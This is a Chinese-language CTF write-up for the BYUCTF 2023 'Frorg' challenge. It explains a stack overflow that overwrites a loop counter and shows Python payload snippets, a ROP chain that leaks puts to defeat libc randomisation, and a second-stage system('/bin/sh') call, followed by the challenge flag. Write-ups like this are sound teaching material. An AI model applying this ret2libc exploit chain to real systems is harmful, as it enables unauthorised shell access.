# BYUCTF 2023 - Frorg

## 题目简述

64 位 ELF 关闭 PIE 和栈保护。程序有 `char frorg[32]`，却按用户给出的 `num` 循环执行 `read(0, frorg + i * 10, 10)`，既不限制次数，也会把循环变量和返回地址一起覆盖。

## 解题过程

第一阶段选择 `num = 9`。首个长输入用 44 字节填充抵达循环变量，再把 `i` 的低字节改成 `4`：

```python
p.sendline(b'A' * 44 + b'\x04\x00\x00\x00')
```

这样下一次 10 字节写入从正确的栈偏移继续，避免循环步进把 ROP 链切散。第一条链为：

```text
pop rdi ; ret
puts@got
puts@plt
main
```

泄漏 `puts` 实际地址后，利用随题提供的 `libc.so.6` 计算：

```python
libc_base = leaked_puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
```

第二次进入 `main`，用同样方式覆盖返回地址，并加入一个 `ret` 做栈对齐，再执行 `system("/bin/sh")`。最终读取：

```text
byuctf{fr0rg13s_s4y_rib1t_rib1t}
```

## 方法总结

这题的难点不只在 ret2libc，还在“每轮写 10 字节、目标地址随 `i` 变化”。需要先控制循环变量，让后续写入与期望 ROP 偏移对齐；再按常规的泄漏、回到 `main`、二阶段调用完成利用。
